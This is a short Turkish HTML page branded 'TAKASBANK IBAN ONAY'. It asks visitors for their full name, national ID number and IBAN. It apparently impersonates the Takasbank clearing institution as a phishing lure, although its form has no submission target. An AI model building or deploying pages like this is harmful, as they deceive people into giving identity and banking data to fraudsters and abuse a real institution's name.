
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>TAKASBANK IBAN ONAY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f8f8;
      margin: 0;
      padding: 0;
    }
    .container {
      text-align: center;
      padding-top: 60px;
    }
    .logo {
      width: 200px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      color: #003366;
      margin-bottom: 10px;
    }
    p {
      color: #333;
      margin-bottom: 30px;
    }
    input[type="text"] {
      width: 60%;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 15px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button {
      padding: 10px 25px;
      font-size: 16px;
      background-color: #003366;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #005599;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="logo.png" alt="Logo" class="logo">
    <h1>TAKASBANK IBAN ONAY</h1>
    <p>Lütfen aşağıdaki bilgileri eksiksiz doldurunuz:</p>
    <form>
      <input type="text" name="fullname" placeholder="Ad Soyad" required>
      <input type="text" name="tc" placeholder="T.C. Kimlik No" required>
      <input type="text" name="iban" placeholder="TR00 0000 0000 0000 0000 0000 00" required>
      <button type="submit">Gönder</button>
    </form>
  </div>
</body>
</html>
